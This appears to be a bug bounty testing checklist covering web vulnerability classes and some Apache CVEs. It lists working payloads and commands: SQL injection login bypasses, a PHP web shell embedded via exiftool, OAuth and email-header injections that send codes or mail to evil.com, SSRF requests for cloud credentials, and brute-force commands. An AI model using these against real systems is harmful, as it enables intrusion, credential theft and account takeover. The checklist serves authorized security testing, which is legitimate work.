## IDOR (Insecure Direct Object Reference)
<!-- id: idor | icon: 💥 | color: #e5c07b -->
Checklists for finding Insecure Direct Object Reference vulnerabilities.

### Test IDOR by substituting IDs in API endpoints
<!-- id: idor-1 | severity: high | tags: idor, bola, access-control -->
Increment, decrement, or swap numeric IDs and UUIDs in API calls to access other users' resources.

**Commands:**
```
GET /api/users/123/profile → try 124, 125, 1
GET /api/orders/abc-uuid  → swap with another user's UUID
GET /api/documents/1      → try 2, 3, ../admin
```

**References:**
- https://portswigger.net/web-security/access-control/idor

---

## Privilege Escalation
<!-- id: privilege-escalation | icon: 💥 | color: #e5c07b -->
Checklists for testing vertical and horizontal privilege escalation.

### Test vertical privilege escalation via role parameter tampering
<!-- id: privesc-1 | severity: critical | tags: privilege-escalation, vertical, role-manipulation -->
Modify role, admin, or permission parameters in requests to elevate to admin or higher-privileged roles.

**Commands:**
```
POST /update-profile with role=admin or isAdmin=true
GET /admin/ while authenticated as a regular user
Modify user_id in JWT payload to an admin user's ID
```

**References:**
- https://portswigger.net/web-security/access-control

---

## Session Management
<!-- id: session-management | icon: 💥 | color: #e5c07b -->
Checklists for testing session token security and lifecycle.

### Test session token entropy and predictability
<!-- id: session-1 | severity: high | tags: session, token-entropy, prediction -->
Collect multiple session tokens and analyze with Burp Sequencer for patterns or low entropy.

**Commands:**
```
curl -c /tmp/cookies.txt https://target.com/login
cat /tmp/cookies.txt | grep session
// Load 100+ tokens into Burp Sequencer for analysis
```

**References:**
- https://portswigger.net/web-security/authentication/securing

### Test session fixation — missing token regeneration post-login
<!-- id: session-2 | severity: high | tags: session, fixation, regeneration -->
Set a known session ID before authentication and verify whether a new session is issued after login.

**References:**
- https://owasp.org/www-community/attacks/Session_fixation

---

## OAuth & SSO Testing
<!-- id: oauth-sso | icon: 💥 | color: #e5c07b -->
Checklists for testing OAuth 2.0 and SSO implementations.

### Test OAuth authorization code theft via open redirect
<!-- id: oauth-1 | severity: critical | tags: oauth, authorization-code, open-redirect, token-theft -->
Chain an open redirect in the OAuth flow to redirect the authorization code to an attacker-controlled server.

**Commands:**
```
redirect_uri=https://target.com/callback?next=https://evil.com
redirect_uri=https://evil.com%2F@target.com/callback
```

**References:**
- https://portswigger.net/web-security/oauth

### Test OAuth state parameter for CSRF
<!-- id: oauth-2 | severity: high | tags: oauth, csrf, state-parameter -->
Remove or reuse the state parameter to verify CSRF protection in OAuth flows.

**References:**
- https://portswigger.net/web-security/csrf/oauth

---

## HTTP Request Smuggling
<!-- id: request-smuggling | icon: 💥 | color: #e5c07b -->
Checklists for detecting HTTP request smuggling vulnerabilities.

### Test CL.TE and TE.CL request smuggling
<!-- id: smuggling-1 | severity: critical | tags: request-smuggling, cl-te, te-cl -->
Exploit Content-Length vs Transfer-Encoding conflicts between front-end and back-end HTTP servers.

**Commands:**
```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**References:**
- https://portswigger.net/web-security/request-smuggling

---

## Web Cache Poisoning & Deception
<!-- id: cache-attacks | icon: 💥 | color: #e5c07b -->
Checklists for detecting web cache poisoning and deception vulnerabilities.

### Test cache poisoning via unkeyed headers
<!-- id: cache-1 | severity: high | tags: cache-poisoning, unkeyed-header, xss -->
Inject payloads via headers excluded from the cache key to poison responses served to all users.

**Commands:**
```
curl -H 'X-Forwarded-Host: evil.com' https://target.com/
curl -H 'X-Forwarded-Scheme: https' -H 'X-Forwarded-Host: evil.com' https://target.com/
```

**References:**
- https://portswigger.net/web-security/web-cache-poisoning

### Test web cache deception via static extension append
<!-- id: cache-2 | severity: high | tags: cache-deception, path-confusion, session-theft -->
Append static file extensions to dynamic authenticated URLs to trick the cache into storing sensitive user data.

**Commands:**
```
curl https://target.com/my-account/profile.css
curl https://target.com/api/user/data.jpg
```

**References:**
- https://portswigger.net/web-security/web-cache-deception

---

## Prototype Pollution
<!-- id: prototype-pollution | icon: 💥 | color: #e5c07b -->
Checklists for detecting JavaScript prototype pollution vulnerabilities.

### Test client-side prototype pollution via URL parameters
<!-- id: proto-1 | severity: high | tags: prototype-pollution, client-side, javascript, xss -->
Inject __proto__ or constructor.prototype keys into URL parameters or JSON bodies to pollute the prototype chain.

**Commands:**
```
https://target.com/?__proto__[foo]=bar
https://target.com/?constructor[prototype][foo]=bar
// Use Burp DOM Invader for automated detection
```

**References:**
- https://portswigger.net/web-security/prototype-pollution

### Test server-side prototype pollution in Node.js
<!-- id: proto-2 | severity: critical | tags: prototype-pollution, server-side, nodejs, rce -->
Send JSON with __proto__ keys to corrupt the server-side prototype chain via merge functions like lodash.merge.

**Commands:**
```
{"__proto__":{"shell":"id","NODE_OPTIONS":"--require /proc/self/cwd/evil.js"}}
```

**References:**
- https://portswigger.net/web-security/prototype-pollution/server-side

---

## CRLF Injection
<!-- id: crlf-injection | icon: 💥 | color: #e5c07b -->
Checklists for detecting CRLF injection and HTTP response splitting.

### Test CRLF injection in URL parameters and redirect locations
<!-- id: crlf-1 | severity: medium | tags: crlf, header-injection, xss, open-redirect -->
Inject %0d%0a into values reflected in HTTP headers to add arbitrary headers or split the HTTP response.

**Commands:**
```
curl 'https://target.com/redirect?url=https://evil.com%0d%0aSet-Cookie:+session=evil'
curl 'https://target.com/page?lang=en%0d%0aContent-Length:+0%0d%0a%0d%0a<script>alert(1)</script>'
```

**References:**
- https://portswigger.net/web-security/request-headers/crlf-injection

---

## File Upload Vulnerabilities
<!-- id: file-upload | icon: 💥 | color: #e5c07b -->
Checklists for finding and exploiting file upload vulnerabilities.

### Test for unrestricted server-side script upload
<!-- id: upload-1 | severity: critical | tags: file-upload, webshell, rce -->
Upload PHP/JSP/ASPX scripts directly. Bypass extension/MIME checks via double extensions or content-type spoofing.

**Commands:**
```
curl -F 'file=@shell.php' https://target.com/upload
// Extension bypass: shell.php.jpg, shell.pHp
// Content-Type: image/jpeg while keeping .php extension
```

**References:**
- https://portswigger.net/web-security/file-upload

### Test path traversal in upload filename for out-of-directory write
<!-- id: upload-2 | severity: critical | tags: file-upload, polyglot, path-traversal, rce -->
Use path traversal in filenames to write outside the upload directory, or embed PHP in image metadata.

**Commands:**
```
Filename: ../../shell.php
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php.jpg
```

**References:**
- https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal

---

## TLS/SSL Configuration
<!-- id: tls-ssl | icon: 💥 | color: #e5c07b -->
Checklists for testing TLS/SSL configuration weaknesses.

### Test for deprecated protocols and weak cipher suites
<!-- id: tls-1 | severity: high | tags: tls, ssl, weak-ciphers, sslv3, tls10 -->
Check if the server accepts deprecated TLS versions (SSLv3, TLS 1.0/1.1) or weak cipher suites (RC4, DES, NULL).

**Commands:**
```
testssl.sh target.com
sslyze --regular target.com
nmap --script ssl-enum-ciphers -p 443 target.com
```

**References:**
- https://testssl.sh/

---

## Security Headers Testing
<!-- id: security-headers | icon: 💥 | color: #e5c07b -->
Checklists for auditing HTTP security header presence and configuration.

### Check for all critical missing security headers
<!-- id: secheaders-1 | severity: medium | tags: security-headers, csp, hsts, x-frame-options -->
Verify HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, and Permissions-Policy are present.

**Commands:**
```
curl -sI https://target.com | grep -iE 'strict-transport|content-security|x-frame|x-content-type|referrer-policy|permissions-policy'
```

**References:**
- https://securityheaders.com/

### Test CSP bypass via JSONP endpoints and trusted domain abuse
<!-- id: secheaders-2 | severity: high | tags: csp, bypass, jsonp, trusted-domain -->
Bypass CSP via JSONP endpoints, open redirects on whitelisted domains, or wildcard script-src entries.

**References:**
- https://portswigger.net/web-security/cross-site-scripting/content-security-policy

---

## Cookie Security
<!-- id: cookie-security | icon: 💥 | color: #e5c07b -->
Checklists for testing cookie security attributes.

### Check for missing Secure, HttpOnly, and SameSite attributes on session cookies
<!-- id: cookie-1 | severity: medium | tags: cookie, secure-flag, httponly, samesite -->
Without Secure: cookies sent over HTTP. Without HttpOnly: XSS-readable. Without SameSite: CSRF-vulnerable.

**Commands:**
```
curl -sI https://target.com | grep -i 'set-cookie'
// All session cookies must have: Secure; HttpOnly; SameSite=Strict or Lax
```

**References:**
- https://owasp.org/www-community/controls/SecureCookieAttribute

---

## Authentication Bypass
<!-- id: auth-bypass | icon: 💥 | color: #e5c07b -->
Checklists for testing authentication bypass techniques.

### Test SQL injection in login form for auth bypass
<!-- id: auth-bypass-1 | severity: critical | tags: auth-bypass, sqli, login -->
Inject SQL metacharacters into username/password fields to bypass authentication logic.

**Commands:**
```
Username: admin'--
Username: ' OR '1'='1'--
Username: admin'/*
Username: admin') OR ('1'='1
```

**References:**
- https://portswigger.net/web-security/sql-injection

### Test forced browsing and direct endpoint access bypass
<!-- id: auth-bypass-2 | severity: high | tags: auth-bypass, forced-browsing, access-control -->
Access protected endpoints without authenticating by guessing paths or using URL/method override headers.

**Commands:**
```
ffuf -u https://target.com/FUZZ -w admin-paths.txt -mc 200
curl -H 'X-Original-URL: /admin' https://target.com/
curl -H 'X-Forwarded-Prefix: /admin' https://target.com/
```

**References:**
- https://portswigger.net/web-security/authentication

---

## Rate Limit Bypass
<!-- id: rate-limit-bypass | icon: 💥 | color: #e5c07b -->
Checklists for bypassing rate limiting and brute-force protection.

### Test rate limit bypass via IP spoofing headers
<!-- id: ratelimit-1 | severity: high | tags: rate-limit-bypass, ip-rotation, brute-force -->
Rotate X-Forwarded-For and X-Real-IP values per request to bypass IP-based rate limiting.

**Commands:**
```
curl -H 'X-Forwarded-For: 1.2.3.4' https://target.com/login -d 'user=admin&pass=test'
// Script: increment last octet per request: X-Forwarded-For: 1.2.3.$i
```

**References:**
- https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks

### Test rate limit bypass via parameter and case variation
<!-- id: ratelimit-2 | severity: medium | tags: rate-limit-bypass, parameter-variation, otp -->
Add trailing spaces, null bytes, or duplicate parameters to make each request appear unique to the rate limiter.

**Commands:**
```
username=admin%20  (trailing space)
username=admin%00  (null byte)
username=admin&username=admin2  (duplicate param)
```

---

## Subdomain Takeover
<!-- id: subdomain-takeover | icon: 💥 | color: #e5c07b -->
Checklists for detecting and exploiting subdomain takeover vulnerabilities.

### Test for dangling CNAME records pointing to unclaimed services
<!-- id: takeover-1 | severity: high | tags: subdomain-takeover, cname, dns -->
Find subdomains with CNAME records pointing to unclaimed GitHub Pages, S3, Heroku, Fastly, or other cloud services.

**Commands:**
```
subfinder -d target.com -silent | httpx -status-code | grep 404
subjack -w subdomains.txt -t 50 -ssl
subzy run --targets subdomains.txt
dig sub.target.com CNAME
```

**References:**
- https://github.com/EdOverflow/can-i-take-over-xyz

---

## Account Takeover Techniques
<!-- id: account-takeover | icon: 💥 | color: #e5c07b -->
Checklists for finding account takeover vulnerabilities.

### Test password reset token predictability and reuse
<!-- id: ato-1 | severity: critical | tags: account-takeover, password-reset, token-reuse -->
Request multiple reset tokens and verify old tokens remain valid and whether token format is predictable.

**Commands:**
```
Request reset for attacker@email.com, analyze token format
Request reset for victim@email.com
Submit attacker's old token in victim's reset flow
```

**References:**
- https://portswigger.net/web-security/authentication/other-mechanisms

### Test host header poisoning in password reset emails
<!-- id: ato-2 | severity: high | tags: account-takeover, host-header, password-reset -->
Inject a malicious Host header to redirect password reset links to an attacker-controlled domain.

**Commands:**
```
POST /reset-password
Host: evil.com
// Check if the emailed reset link contains evil.com
```

**References:**
- https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning

---

## WAF Bypass Techniques
<!-- id: waf-bypass | icon: 💥 | color: #e5c07b -->
Checklists for bypassing Web Application Firewalls.

### Test WAF bypass via encoding and case obfuscation
<!-- id: waf-1 | severity: high | tags: waf-bypass, encoding, obfuscation, sqli -->
Use URL encoding, double encoding, Unicode normalization, and case variation to bypass WAF signature rules.

**Commands:**
```
' OR 1=1--   → %27%20OR%201%3D1--
<script>     → %3Cscript%3E or <ScRiPt>
UNION SELECT → UN/**/ION SEL/**/ECT
```

**References:**
- https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF

### Test WAF bypass via chunked encoding and request smuggling
<!-- id: waf-2 | severity: high | tags: waf-bypass, chunked-encoding, request-smuggling -->
Use Transfer-Encoding: chunked or HTTP request smuggling to deliver payloads past the WAF to the backend.

**References:**
- https://portswigger.net/web-security/request-smuggling/exploiting/bypass-front-end-security-controls

---

## Google Dorking & OSINT
<!-- id: google-dorking | icon: 💥 | color: #e5c07b -->
Checklists for using Google dorks and OSINT in bug bounty reconnaissance.

### Use Google dorks to find exposed files and admin panels
<!-- id: dork-1 | severity: info | tags: google-dork, osint, recon, info-disclosure -->
Search Google for sensitive files, login pages, and exposed directories on the target domain.

**Commands:**
```
site:target.com filetype:env OR filetype:log OR filetype:sql
site:target.com inurl:admin OR inurl:login OR inurl:dashboard
site:target.com "password" OR "api_key" OR "secret"
```

**References:**
- https://www.exploit-db.com/google-hacking-database

### Search Shodan and GitHub for exposed services and leaked secrets
<!-- id: dork-2 | severity: info | tags: osint, shodan, github, pastebin -->
Find exposed infrastructure and leaked credentials via Shodan, GitHub code search, and Pastebin.

**Commands:**
```
shodan search org:"Target Company" http.title:"admin"
site:github.com "target.com" password OR apikey OR secret
site:pastebin.com "target.com"
```

**References:**
- https://www.shodan.io/

---

## Port Scanning & Service Enumeration
<!-- id: port-scanning | icon: 💥 | color: #e5c07b -->
Checklists for port scanning and service discovery in bug bounty programs.

### Perform full port scan across all discovered IP ranges
<!-- id: portscan-1 | severity: info | tags: port-scanning, nmap, masscan, service-discovery -->
Scan all 65535 ports on discovered IP ranges to identify exposed services beyond HTTP/HTTPS.

**Commands:**
```
masscan -iL ips.txt -p 0-65535 --rate=10000 -oG masscan.out
nmap -sV -sC -p$(grep open masscan.out | awk '{print $4}' | cut -d/ -f1 | tr '\n' ',') target.com
naabu -host target.com -p - -silent | httpx -silent
```

**References:**
- https://nmap.org/book/man.html

---

## Technology Fingerprinting
<!-- id: tech-fingerprinting | icon: 💥 | color: #e5c07b -->
Checklists for identifying web technologies and infrastructure during reconnaissance.

### Fingerprint technologies via HTTP headers and page content
<!-- id: techfp-1 | severity: info | tags: fingerprinting, wappalyzer, whatweb, recon -->
Identify server software, frameworks, CMS platforms, and JS libraries from response headers and page source.

**Commands:**
```
curl -sI https://target.com | grep -iE 'server|x-powered-by|x-generator|set-cookie'
whatweb https://target.com
wappalyzer https://target.com
```

**References:**
- https://www.wappalyzer.com/

---

## JavaScript Analysis
<!-- id: javascript-analysis | icon: 💥 | color: #e5c07b -->
Checklists for analyzing JavaScript files for security vulnerabilities and sensitive information.

### Extract API keys and secrets from JavaScript source files
<!-- id: jsanalysis-1 | severity: high | tags: javascript, api-key, secret, source-analysis -->
Search JavaScript bundles for hardcoded API keys, tokens, internal endpoints, and credentials.

**Commands:**
```
gau target.com | grep '\.js' | httpx -silent -o js-urls.txt
cat js-urls.txt | xargs -I{} sh -c 'curl -sL "{}" | grep -oE "(api_key|apiKey|secret|token|AKIA)[\"= ]{0,5}[a-zA-Z0-9+/]{20,}"'
trufflehog filesystem --directory . --only-verified
```

**References:**
- https://github.com/GerbenJavado/LinkFinder

---

## DNS Security Testing
<!-- id: dns-security | icon: 💥 | color: #e5c07b -->
Checklists for DNS security testing during bug bounty reconnaissance.

### Test for DNS zone transfer (AXFR)
<!-- id: dns-1 | severity: high | tags: dns, zone-transfer, axfr, info-disclosure -->
Request a full DNS zone transfer from the nameserver — if allowed, all subdomain records are revealed.

**Commands:**
```
dig axfr target.com @ns1.target.com
dnsrecon -d target.com -t axfr
nmap -p 53 --script dns-zone-transfer target.com
```

**References:**
- https://digi.ninja/projects/zonetransfer.me.php

### Test for missing DNSSEC and email security records
<!-- id: dns-2 | severity: medium | tags: dns, dnssec, spf, dkim, dmarc -->
Verify DNSSEC is configured and SPF/DKIM/DMARC records exist to prevent spoofing and cache poisoning.

**Commands:**
```
dig +dnssec target.com
dig TXT target.com | grep spf
dig TXT _dmarc.target.com
```

---

## Email Security Testing
<!-- id: email-security | icon: 💥 | color: #e5c07b -->
Checklists for testing email security configurations (SPF, DKIM, DMARC, header injection).

### Test for missing SPF/DKIM/DMARC records enabling spoofing
<!-- id: email-1 | severity: medium | tags: email, spf, dkim, dmarc, spoofing -->
Missing or permissive records allow attackers to send spoofed emails appearing to come from the target domain.

**Commands:**
```
dig TXT target.com | grep spf
dig TXT _dmarc.target.com
dig TXT default._domainkey.target.com
```

**References:**
- https://dmarc.org/

### Test for email header injection via contact/registration forms
<!-- id: email-2 | severity: medium | tags: email, header-injection, crlf -->
Inject CRLF sequences into email-related fields to add extra headers or CC attacker addresses.

**Commands:**
```
Name: attacker%0d%0aCC:evil@attacker.com
Email: victim@target.com%0d%0aBCC:attacker@evil.com
```

---

## WebSocket Testing
<!-- id: websocket-testing | icon: 💥 | color: #e5c07b -->
Checklists for security testing of WebSocket implementations.

### Test WebSocket authentication and IDOR in message handling
<!-- id: ws-1 | severity: high | tags: websocket, auth, idor, access-control -->
Verify WebSocket connections require authentication and enforce authorization — WS often bypasses HTTP-level security controls applied to REST endpoints.

**Commands:**
```
// Use Burp Suite WebSocket history to inspect frames
// Test: connect without auth token; replay another user's authenticated WS messages
```

**References:**
- https://portswigger.net/web-security/websockets

### Test Cross-Site WebSocket Hijacking (CSWSH)
<!-- id: ws-2 | severity: high | tags: websocket, cswsh, csrf -->
If WS handshakes rely only on session cookies without Origin validation, attacker pages can hijack authenticated connections.

**References:**
- https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking

---

## GraphQL Testing
<!-- id: graphql-testing | icon: 💥 | color: #e5c07b -->
Checklists for security testing of GraphQL APIs.

### Test GraphQL for introspection and schema exposure
<!-- id: gql-1 | severity: medium | tags: graphql, introspection, schema-exposure -->
Enabled introspection reveals the full API schema — all types, mutations, queries, and potentially sensitive operations.

**Commands:**
```
curl -X POST https://target.com/graphql -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name}}}"}'
```

**References:**
- https://portswigger.net/web-security/graphql

### Test GraphQL for injection and IDOR via query arguments
<!-- id: gql-2 | severity: high | tags: graphql, injection, idor, authorization -->
Test mutations and queries for SQL/NoSQL injection via arguments, and IDOR by varying object ID values.

**Commands:**
```
{"query":"query{user(id:\"1\"){email password}}"}
{"query":"query{user(id:\"2\"){email password}}"}
```

---

## Cloud Security Testing
<!-- id: cloud-security | icon: 💥 | color: #e5c07b -->
Checklists for testing cloud infrastructure security.

### Test for public S3 buckets and cloud storage misconfigurations
<!-- id: cloud-1 | severity: critical | tags: cloud, s3, storage, data-exposure -->
Enumerate and access publicly readable S3, GCS, and Azure Blob containers belonging to the target.

**Commands:**
```
aws s3 ls s3://target-bucket --no-sign-request
curl https://target-bucket.s3.amazonaws.com/
gcloudbucketbrute target.com
```

**References:**
- https://github.com/nahamsec/lazys3

### Test SSRF to reach cloud instance metadata service (IMDS)
<!-- id: cloud-2 | severity: critical | tags: cloud, ssrf, imds, cloud-metadata -->
Exploit SSRF to reach the instance metadata endpoint and extract IAM credentials for cloud account takeover.

**Commands:**
```
curl 'https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
curl 'https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'
```

**References:**
- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf

---

## Data Exposure
<!-- id: data-exposure | icon: 💥 | color: #e5c07b -->
Checklists for finding unintended data exposure.

### Test for sensitive data in API responses not shown in UI
<!-- id: dataexp-1 | severity: high | tags: data-exposure, api, pii, credentials -->
Compare API response fields vs UI-displayed fields — look for passwords, tokens, SSNs, and other users' data.

**Commands:**
```
curl -s https://target.com/api/user/profile | jq .
// Look for: password, password_hash, api_key, ssn, full card numbers
```

**References:**
- https://owasp.org/www-project-api-security/

### Test for exposed .git, .env, and backup files
<!-- id: dataexp-2 | severity: critical | tags: data-exposure, git, env, backup -->
Check for web-accessible source control files, environment configs, and backup archives revealing credentials.

**Commands:**
```
curl https://target.com/.git/config
curl https://target.com/.env
curl https://target.com/backup.zip
curl https://target.com/db.sql
```

---

## PostMessage Security
<!-- id: postmessage | icon: 💥 | color: #e5c07b -->
Checklists for testing postMessage cross-origin communication security.

### Test for missing origin validation in postMessage handlers
<!-- id: postmsg-1 | severity: high | tags: postmessage, origin-validation, xss -->
JavaScript event listeners not validating event.origin accept malicious messages from any origin, enabling DOM XSS.

**Commands:**
```
// From attacker page:
var w = window.open('https://target.com/page');
setTimeout(() => w.postMessage('{"type":"config","value":"<img src=x onerror=alert(1)>"}', '*'), 2000);
```

**References:**
- https://portswigger.net/web-security/dom-based/controlling-the-web-message-source

---

## Web Storage Security
<!-- id: web-storage | icon: 💥 | color: #e5c07b -->
Checklists for testing localStorage and sessionStorage security.

### Test for sensitive data stored in localStorage/sessionStorage
<!-- id: webstorage-1 | severity: medium | tags: web-storage, localstorage, token-exposure -->
Sensitive data in localStorage is accessible to all JavaScript on the same origin — including XSS payloads.

**Commands:**
```
// Browser console:
Object.keys(localStorage).forEach(k => console.log(k, localStorage.getItem(k)));
Object.keys(sessionStorage).forEach(k => console.log(k, sessionStorage.getItem(k)));
```

**References:**
- https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html

---

## Service Worker Security
<!-- id: service-worker | icon: 💥 | color: #e5c07b -->
Checklists for testing service worker security misconfigurations.

### Test for service worker scope abuse and persistent XSS
<!-- id: sw-1 | severity: high | tags: service-worker, cache-poisoning, xss-persistence -->
Malicious service workers intercept all page requests. If the SW script URL is injectable, XSS persists across page loads.

**Commands:**
```
// Check registered workers in browser console:
navigator.serviceWorker.getRegistrations().then(r => console.log(r))
```

**References:**
- https://portswigger.net/web-security/service-workers

---

## HTTP/2 Security
<!-- id: http2-security | icon: 💥 | color: #e5c07b -->
Checklists for testing HTTP/2 specific vulnerabilities.

### Test HTTP/2 request smuggling via H2.CL and H2.TE
<!-- id: http2-1 | severity: critical | tags: http2, request-smuggling, h2c, header-injection -->
Exploit HTTP/2 downgrade to inject HTTP/1.1 request prefixes through H2 frontends into HTTP/1.1 backends.

**Commands:**
```
// Use Burp Suite HTTP/2 Repeater with H2.CL and H2.TE smuggling modes enabled
// Look for: Content-Length mismatch when server downgrades from H2 to H1
```

**References:**
- https://portswigger.net/web-security/request-smuggling/advanced

---

## Server Misconfiguration
<!-- id: server-misconfig | icon: 💥 | color: #e5c07b -->
Checklists for detecting web server misconfigurations.

### Test for exposed management interfaces with default credentials
<!-- id: serverconf-1 | severity: high | tags: misconfiguration, default-creds, management-interface -->
Enumerate management panels (phpMyAdmin, Grafana, Jenkins, Kibana) accessible with default or weak credentials.

**Commands:**
```
ffuf -u https://target.com/FUZZ -w management-paths.txt -mc 200,401,403
curl https://target.com/phpinfo.php
curl https://target.com/server-status
curl https://target.com/server-info
```

**References:**
- https://owasp.org/www-project-top-ten/

### Test for unnecessary HTTP methods (PUT, DELETE, TRACE)
<!-- id: serverconf-2 | severity: medium | tags: misconfiguration, http-methods, trace, put -->
Dangerous HTTP methods left enabled allow file upload (PUT), deletion (DELETE), or header reflection (TRACE).

**Commands:**
```
curl -X OPTIONS https://target.com/ -v | grep Allow
curl -X TRACE https://target.com/ -v
curl -X PUT https://target.com/test.txt -d 'test'
```

---

## Input Validation
<!-- id: input-validation | icon: 💥 | color: #e5c07b -->
Checklists for testing input validation failures.

### Test integer overflow, type confusion, and boundary values
<!-- id: inputval-1 | severity: medium | tags: input-validation, integer-overflow, boundary -->
Submit unexpected data types, very large numbers, negative values, null bytes, and Unicode edge cases.

**Commands:**
```
price=9999999999999999
quantity=-1
id=null
id=0.1
id[]=1
name=AAAA...A (10000 chars)
```

**References:**
- https://owasp.org/www-project-testing/

---

## Security Misconfiguration
<!-- id: security-misconfig | icon: 💥 | color: #e5c07b -->
Checklists for finding security misconfigurations across the application stack.

### Test for directory listing and exposed configuration files
<!-- id: secmisconfig-1 | severity: high | tags: misconfiguration, directory-listing, source-exposure -->
Check for enabled directory browsing and exposed config files in public web directories.

**Commands:**
```
curl https://target.com/ -sL | grep -i 'index of'
curl https://target.com/config.php
curl https://target.com/wp-config.php.bak
curl https://target.com/web.config
```

---

## Login Page Security
<!-- id: login-security | icon: 💥 | color: #e5c07b -->
Checklists for security testing of login and authentication pages.

### Test for username enumeration via response differences
<!-- id: login-1 | severity: medium | tags: login, user-enumeration, timing, response-difference -->
Compare error messages, response times, and status codes for valid vs invalid usernames to enumerate accounts.

**Commands:**
```
Valid user → "Incorrect password" | Invalid user → "User not found"
// Measure response time — timing differences reveal valid usernames
```

**References:**
- https://portswigger.net/web-security/authentication/password-based

### Test for brute-force vulnerability on login endpoints
<!-- id: login-2 | severity: high | tags: login, brute-force, lockout, rate-limit -->
Attempt multiple password guesses on login and API auth endpoints without triggering lockout or rate limiting.

**Commands:**
```
ffuf -u https://target.com/api/login -X POST -d '{"user":"admin","pass":"FUZZ"}' -w passwords.txt
hydra -l admin -P rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

---

## Payment & Checkout Security
<!-- id: payment-security | icon: 💥 | color: #e5c07b -->
Checklists for testing payment and checkout flow security.

### Test for price manipulation in checkout requests
<!-- id: payment-1 | severity: critical | tags: payment, price-manipulation, business-logic -->
Intercept and modify prices, quantities, or discount values in checkout requests to fraudulent values.

**Commands:**
```
Intercept POST /checkout: price=0.01, quantity=-1, discount=100
Apply promo codes multiple times via race condition
Change currency code to a lower-value currency
```

**References:**
- https://portswigger.net/web-security/logic-flaws

---

## Admin Panel Security
<!-- id: admin-panel | icon: 💥 | color: #e5c07b -->
Checklists for testing administrative interface security.

### Test admin panel for unauthorized access and default credentials
<!-- id: admin-1 | severity: critical | tags: admin-panel, default-creds, access-control -->
Enumerate common admin paths and test for unauthenticated access or weak credentials.

**Commands:**
```
ffuf -u https://target.com/FUZZ -w admin-paths.txt -mc 200,302,401,403
curl -u admin:admin https://target.com/admin/
curl -u admin:password123 https://target.com/admin/
```

---

## Error Handling
<!-- id: error-handling | icon: 💥 | color: #e5c07b -->
Checklists for testing error handling and information leakage through error responses.

### Test for verbose errors revealing stack traces and internals
<!-- id: error-1 | severity: medium | tags: error-handling, stack-trace, info-disclosure -->
Trigger errors with malformed input and check if stack traces, DB queries, file paths, or internal hostnames are returned.

**Commands:**
```
curl 'https://target.com/api/user/INVALID'
curl -X POST https://target.com/api/data -H 'Content-Type: application/json' -d 'INVALID'
curl 'https://target.com/page?id=99999999999'
```

**References:**
- https://owasp.org/www-community/Improper_Error_Handling

---

## Apache Shiro
<!-- id: apache-shiro | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache Shiro Java authentication and authorization framework.

### Check Apache Shiro for RememberMe deserialization RCE (CVE-2016-4437)
<!-- id: shiro-1 | severity: critical | tags: apache-shiro, deserialization, rce, cve -->
Apache Shiro 1.2.4 and earlier use a hardcoded AES key for RememberMe cookies. Attackers who know the key craft malicious cookies triggering Java deserialization RCE.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4437

### Check Apache Shiro for authentication bypass via path traversal (CVE-2020-17523)
<!-- id: shiro-2 | severity: critical | tags: apache-shiro, auth-bypass, path-traversal, cve -->
Multiple Shiro versions are vulnerable to authentication bypass via semicolons, encoded slashes, or null bytes in request URIs.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-17523

---

## Apache APISIX
<!-- id: apache-apisix | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache APISIX API gateway.

### Check APISIX admin API for RCE via IP bypass (CVE-2022-24112)
<!-- id: apisix-1 | severity: critical | tags: apache-apisix, rce, admin-api, cve -->
CVE-2022-24112 allows unauthenticated attackers to bypass IP restriction on the APISIX admin API and inject malicious Lua routes leading to Remote Code Execution.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24112

---

## Apache StreamPipes
<!-- id: apache-streampipes | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache StreamPipes IoT data pipeline platform.

### Check Apache StreamPipes for account takeover via password reset (CVE-2024-29069)
<!-- id: streampipes-1 | severity: high | tags: apache-streampipes, account-takeover, password-reset, cve -->
CVE-2024-29069 allows user account takeover in Apache StreamPipes via password reset token mishandling without invalidating existing sessions.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-29069

---

## Apache Unomi
<!-- id: apache-unomi | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache Unomi customer data platform.

### Check Apache Unomi for OGNL/MVEL injection RCE (CVE-2020-13942)
<!-- id: unomi-1 | severity: critical | tags: apache-unomi, rce, ognl, mvel, cve -->
CVE-2020-13942 allows unauthenticated RCE on Apache Unomi by injecting OGNL or MVEL expressions in profile properties evaluated server-side.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13942

---

## RocketMQ
<!-- id: rocketmq | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache RocketMQ distributed message queue.

### Check RocketMQ for unauthenticated command injection RCE (CVE-2023-33246)
<!-- id: rocketmq-1 | severity: critical | tags: rocketmq, rce, command-injection, cve -->
CVE-2023-33246 allows unauthenticated RCE on RocketMQ brokers via crafted UPDATE_AND_CREATE_TOPIC commands on ports 9876/10911 — exploited for botnet deployment.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33246

---

## Openfire
<!-- id: openfire | icon: 🛠️ | color: #e06c75 -->
Security checklists for Openfire XMPP messaging server.

### Check Openfire for authentication bypass and admin RCE (CVE-2023-32315)
<!-- id: openfire-1 | severity: critical | tags: openfire, auth-bypass, rce, cve -->
